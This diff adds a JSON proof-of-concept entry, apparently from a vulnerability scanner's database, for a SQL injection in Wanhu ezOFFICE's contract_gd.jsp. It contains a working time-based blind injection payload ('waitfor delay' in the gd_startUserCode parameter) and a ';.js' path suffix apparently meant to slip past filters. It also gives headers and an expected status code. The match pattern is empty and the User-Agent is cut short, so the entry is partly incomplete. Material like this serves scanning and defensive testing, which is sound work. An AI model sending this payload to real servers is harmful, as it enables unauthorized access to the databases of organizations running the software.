@@ -1,0 +1,14 @@
+{
+	"name":"万户ezOFFICE-contract_gd.jspSQL注入",
+	"tag":"wanhu",
+	"type":"other",
+	"poc":{
+		"pocGet":"/defaultroot/modules/subsidiary/contract/contract_gd.jsp;.js?gd=1&gd_startUserCode=1%27%3Bwaitfor%20delay%20%270%3A0%3A5%27--",
+		"header":{
+			"User-Agent":"Mozilla/5.0 (Linux;",
+			"content-type":"text/plain"
+		},
+		"status_code":"200",
+		"pattern":"()"
+	}
+}
